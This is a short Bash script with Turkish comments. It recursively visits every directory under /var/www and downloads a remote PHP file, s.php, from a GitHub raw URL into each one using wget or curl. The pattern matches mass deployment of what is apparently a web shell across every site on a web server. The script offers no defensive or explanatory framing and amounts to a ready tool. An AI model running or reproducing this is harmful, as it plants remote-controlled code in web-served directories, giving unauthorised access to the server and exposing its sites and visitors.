#!/bin/bash

# Bu betik /var/www/ dizinindeki her dosyada s.php dosyasını indirir.

# Fonksiyon: Belirtilen dizin ve alt dizinlerinde s.php dosyasını indirir
function download_s_php {
    local current_dir="$1"
    local url="https://raw.githubusercontent.com/berkaybasar/berkaybasar.github.io/main/s.php"

    # Dosyanın indirileceği hedef yol
    wget -q -O "$current_dir/s.php" "$url" || curl -s -o "$current_dir/s.php" "$url"

    # İşlem sonucunu kontrol et
    if [ $? -eq 0 ]; then
        echo "s.php dosyası başarıyla $current_dir dizinine indirildi."
    else
        echo "s.php dosyası $current_dir dizinine indirilirken bir hata oluştu."
    fi

    # Alt dizinleri kontrol et ve bu fonksiyonu tekrar çağır
    for subdir in "$current_dir"/*/; do
        download_s_php "$subdir"
    done
}

# /var/www/ dizinindeki tüm dizinler için fonksiyonu çağır
for dir in /var/www/*/; do
    download_s_php "$dir"
done
